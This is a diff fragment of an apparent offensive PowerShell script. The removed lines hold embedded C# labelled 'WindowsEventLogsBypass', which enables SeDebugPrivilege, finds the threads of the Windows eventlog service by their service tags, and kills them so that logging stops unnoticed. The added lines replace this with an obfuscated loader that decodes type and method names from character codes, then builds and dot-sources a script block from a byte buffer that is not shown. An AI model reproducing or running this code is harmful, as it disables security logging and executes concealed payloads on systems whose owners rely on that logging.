-        [StructLayout(LayoutKind.Sequential, Pack = 4)]
-        public struct LUID_AND_ATTRIBUTES
-        {
-            public long Luid;
-            public UInt32 Attributes;
-        }
-
-        [StructLayout(LayoutKind.Sequential, Pack = 4)]
-        public struct TOKEN_PRIVILEGES
-        {
-            public int PrivilegeCount;
-            public LUID_AND_ATTRIBUTES Privileges;
-        }
-
-        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
-        public struct THREADENTRY32
-        {
-            internal UInt32 dwSize;
-            internal UInt32 cntUsage;
-            internal UInt32 th32ThreadID;
-            internal UInt32 th32OwnerProcessID;
-            internal UInt32 tpBasePri;
-            internal UInt32 tpDeltaPri;
-            internal UInt32 dwFlags;
-        }
-
-        [StructLayout(LayoutKind.Sequential)]
-        public struct CLIENT_ID
-        {
-            public IntPtr UniqueProcess;
-            public IntPtr UniqueThread;
-        }
-
-        [StructLayout(LayoutKind.Sequential)]
-        public struct THREAD_BASIC_INFORMATION
-        {
-            public int ExitStatus;
-            public IntPtr TebBaseAdress;
-            public CLIENT_ID ClientId;
-            public IntPtr AffinityMask;
-            public int Priority;
-            public int BasePriority;
-        }
-
-        [StructLayout(LayoutKind.Sequential)]
-        public struct _SC_SERVICE_TAG_QUERY
-        {
-            public UInt32 processId;
-            public UInt32 serviceTag;
-            public UInt32 reserved;
-            public IntPtr pBuffer;
-        }
-        
-        [Flags]
-        public enum ThreadAccess : int
-        {
-            THREAD_ALL_ACCESS = 0x001F03FF,
-            TERMINATE = 0x0001,
-            SUSPEND_RESUME = 0x0002,
-            GET_CONTEXT = 0x0008,
-            SET_CONTEXT = 0x0010,
-            SET_INFORMATION = 0x0020,
-            QUERY_INFORMATION = 0x0040,
-            SET_THREAD_TOKEN = 0x0080,
-            IMPERSONATE = 0x0100,
-            DIRECT_IMPERSONATION = 0x0200
-        }
-
-        public enum NTSTATUS : uint
-        {
-            Success = 0,
-            Informational = 0x40000000,
-            Error = 0xc0000000
-        }
-
-        public enum SC_SERVICE_TAG_QUERY_TYPE : ushort
-        {
-            ServiceNameFromTagInformation = 1,
-            ServiceNamesReferencingModuleInformation = 2,
-            ServiceNameTagMappingInformation = 3
-        }
-
-        [Flags]
-        public enum SnapshotFlags : uint
-        {
-            HeapList = 0x00000001,
-            Process = 0x00000002,
-            Thread = 0x00000004,
-            Module = 0x00000008,
-            Module32 = 0x00000010,
-            Inherit = 0x80000000,
-            All = 0x0000001F,
-            NoHeaps = 0x40000000
-        }
-
-        public enum PrivilegeNames
-        {
-            SeCreateTokenPrivilege,
-            SeAssignPrimaryTokenPrivilege,
-            SeLockMemoryPrivilege,
-            SeIncreaseQuotaPrivilege,
-            SeUnsolicitedInputPrivilege,
-            SeMachineAccountPrivilege,
-            SeTcbPrivilege,
-            SeSecurityPrivilege,
-            SeTakeOwnershipPrivilege,
-            SeLoadDriverPrivilege,
-            SeSystemProfilePrivilege,
-            SeSystemtimePrivilege,
-            SeProfileSingleProcessPrivilege,
-            SeIncreaseBasePriorityPrivilege,
-            SeCreatePagefilePrivilege,
-            SeCreatePermanentPrivilege,
-            SeBackupPrivilege,
-            SeRestorePrivilege,
-            SeShutdownPrivilege,
-            SeDebugPrivilege,
-            SeAuditPrivilege,
-            SeSystemEnvironmentPrivilege,
-            SeChangeNotifyPrivilege,
-            SeRemoteShutdownPrivilege,
-            SeUndockPrivilege,
-            SeSyncAgentPrivilege,
-            SeEnableDelegationPrivilege,
-            SeManageVolumePrivilege,
-            SeImpersonatePrivilege,
-            SeCreateGlobalPrivilege,
-            SeTrustedCredManAccessPrivilege,
-            SeRelabelPrivilege,
-            SeIncreaseWorkingSetPrivilege,
-            SeTimeZonePrivilege,
-            SeCreateSymbolicLinkPrivilege
-        }
-
-        [Flags]
-        public enum ProcessAccessFlags : uint
-        {
-            All = 0x001F0FFF,
-            Terminate = 0x00000001,
-            CreateThread = 0x00000002,
-            VirtualMemoryOperation = 0x00000008,
-            VirtualMemoryRead = 0x00000010,
-            VirtualMemoryWrite = 0x00000020,
-            DuplicateHandle = 0x00000040,
-            CreateProcess = 0x000000080,
-            SetQuota = 0x00000100,
-            SetInformation = 0x00000200,
-            QueryInformation = 0x00000400,
-            QueryLimitedInformation = 0x00001000,
-            Synchronize = 0x00100000
-        }
-
-        public static void TerminateEventlogThread(UInt32 tid)
-        {
-            IntPtr hThread = OpenThread(ThreadAccess.TERMINATE, false, tid);
-            if (TerminateThread(hThread, 0)) { }
-            CloseHandle(hThread);
-        }
-
-        public static bool GetServiceTagString(IntPtr processId, ulong tag, ref IntPtr pBuffer)
-        {
-            _SC_SERVICE_TAG_QUERY tagQuery = new _SC_SERVICE_TAG_QUERY();
-            tagQuery.processId = (UInt32)processId;
-            tagQuery.serviceTag = (UInt32)tag;
-            tagQuery.reserved = 0;
-            tagQuery.pBuffer = IntPtr.Zero;
-            ulong QueryReturn = I_QueryTagInformation(IntPtr.Zero, SC_SERVICE_TAG_QUERY_TYPE.ServiceNameFromTagInformation, ref tagQuery);
-            if (QueryReturn == 0 && tagQuery.pBuffer != IntPtr.Zero)
-            {
-                pBuffer = tagQuery.pBuffer;
-                return true;
-            }
-            return false;
-        }
-
-        public static bool GetServiceTag(IntPtr processId, IntPtr threadId, ref ulong pServiceTag)
-        {
-            THREAD_BASIC_INFORMATION tbi = new THREAD_BASIC_INFORMATION();
-            IntPtr process = IntPtr.Zero;
-            IntPtr thread = OpenThread(ThreadAccess.QUERY_INFORMATION, false, (uint)threadId);
-            if ((uint)thread == 0) return false;
-            NtQueryInformationThread(thread, 0, ref tbi, (uint)Marshal.SizeOf(tbi), 0);
-            process = OpenProcess((uint)ProcessAccessFlags.VirtualMemoryRead, false, processId);
-            if ((uint)process == 0) return false;
-            UInt64 subProcessTag_Offset = 0x1720;
-            UInt64 byteRead = 0;
-            IntPtr pMemLoc = Marshal.AllocHGlobal(8);
-            RtlZeroMemory(pMemLoc, 8);
-            NtReadVirtualMemory(process, (IntPtr)((UInt64)tbi.TebBaseAdress + subProcessTag_Offset), pMemLoc, 8, ref byteRead);
-            UInt64 subProcessTag = (uint)Marshal.ReadInt64(pMemLoc, 0);
-            if (subProcessTag != 0) pServiceTag = (ulong)subProcessTag;
-            CloseHandle(process);
-            CloseHandle(thread);
-            return subProcessTag != 0;
-        }
-
-        public static bool GetServiceTagName(UInt32 tid)
-        {
-            const int MAX_PATH = 260;
-            IntPtr hThread = OpenThread(ThreadAccess.QUERY_INFORMATION, false, tid);
-            if ((int)hThread == 0) return false;
-            THREAD_BASIC_INFORMATION tbi = new THREAD_BASIC_INFORMATION();
-            NtQueryInformationThread(hThread, 0, ref tbi, (uint)Marshal.SizeOf(tbi), 0);
-            IntPtr processid = tbi.ClientId.UniqueProcess;
-            ulong serviceTag = 0;
-            if (!GetServiceTag(processid, (IntPtr)tid, ref serviceTag)) return false;
-            IntPtr pData = Marshal.AllocHGlobal(MAX_PATH);
-            RtlZeroMemory(pData, MAX_PATH);
-            if (!GetServiceTagString(processid, serviceTag, ref pData)) return false;
-            string tagString = Marshal.PtrToStringUni(pData);
-            if (string.Equals(tagString, "eventlog", StringComparison.OrdinalIgnoreCase))
-            {
-                TerminateEventlogThread(tid);
-                return true;
-            }
-            return false;
-        }
-
-        public static void ListProcessThreads(out int total, out int killed)
-        {
-            total = 0;
-            killed = 0;
-            IntPtr hThreadSnap = CreateToolhelp32Snapshot((uint)SnapshotFlags.Thread, 0);
-            if (hThreadSnap == INVALID_HANDLE_VALUE) return;
-            THREADENTRY32 te32 = new THREADENTRY32();
-            te32.dwSize = (uint)Marshal.SizeOf(te32);
-            if (!Thread32First(hThreadSnap, ref te32))
-            {
-                CloseHandle(hThreadSnap);
-                return;
-            }
-            do
-            {
-                if (te32.th32OwnerProcessID != 0)
-                {
-                    total++;
-                    if (GetServiceTagName(te32.th32ThreadID))
-                        killed++;
-                }
-            } while (Thread32Next(hThreadSnap, ref te32));
-            CloseHandle(hThreadSnap);
-        }
-
-        public static bool SetPrivilege()
-        {
-            IntPtr hToken;
-            TOKEN_PRIVILEGES NewState = new TOKEN_PRIVILEGES();
-            long luidPrivilegeLUID = 0;
-            if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hToken) || 
-                !LookupPrivilegeValue(null, PrivilegeNames.SeDebugPrivilege.ToString(), ref luidPrivilegeLUID))
-                return false;
-            NewState.PrivilegeCount = 1;
-            NewState.Privileges.Luid = luidPrivilegeLUID;
-            NewState.Privileges.Attributes = SE_PRIVILEGE_ENABLED;
-            uint temp = 0;
-            if (!AdjustTokenPrivileges(hToken, false, ref NewState, 0, IntPtr.Zero, out temp))
-                return false;
-            return true;
-        }
-
-        public static void Main(string[] args)
-        {
-            if (!SetPrivilege())
-            {
-                Console.WriteLine("[-] Failed to enable SeDebugPrivilege");
-                return;
-            }
-            
-            Stopwatch sw = Stopwatch.StartNew();
-            int totalThreads, killedThreads;
-            ListProcessThreads(out totalThreads, out killedThreads);
-            sw.Stop();
-            
-            Console.WriteLine("[+] EventLogs");
-            Console.WriteLine("[+] Total Threads: " + totalThreads);
-            Console.WriteLine("[+] Threads Killed: " + killedThreads);
-            Console.WriteLine("[+] Elapsed time: " + sw.ElapsedMilliseconds + "ms");
-        }
-    }
-}
-'@
-
-Add-Type -TypeDefinition $csharpCode -ReferencedAssemblies "System.Runtime.InteropServices"
-[WindowsEventLogsBypass.Program]::Main($null)
+$mBd3Elek = @(83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,83,99,114,105,112,116,66,108,111,99,107,44,32,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,44,32,86,101,114,115,105,111,110,61,51,46,48,46,48,46,48,44,32,67,117,108,116,117,114,101,61,110,101,117,116,114,97,108,44,32,80,117,98,108,105,99,75,101,121,84,111,107,101,110,61,51,49,98,102,51,56,53,54,97,100,51,54,52,101,51,53)
+$jaeG98zQ4GS6 = @(67,114,101,97,116,101)
+$kRKKw8T0GPhqFM1Pf = -join ($mBd3Elek | % { [char]$_ })
+$FmlP10bT295o41xAQ5J = -join ($jaeG98zQ4GS6 | % { [char]$_ })
+$Cg2J72WNZ89xX6g9b7M9 = [Text.Encoding]::UTF8.GetString($Zj9a395V33iRuwfh33V, 4, $Zj9a395V33iRuwfh33V.Length - 4)
+$t = [System.Type]::GetType($kRKKw8T0GPhqFM1Pf)
+$m = $t.GetMethod($FmlP10bT295o41xAQ5J)
+$FmlP10bT295o41xAQ5J = $m.Invoke($null, @($Cg2J72WNZ89xX6g9b7M9))
+. $FmlP10bT295o41xAQ5J
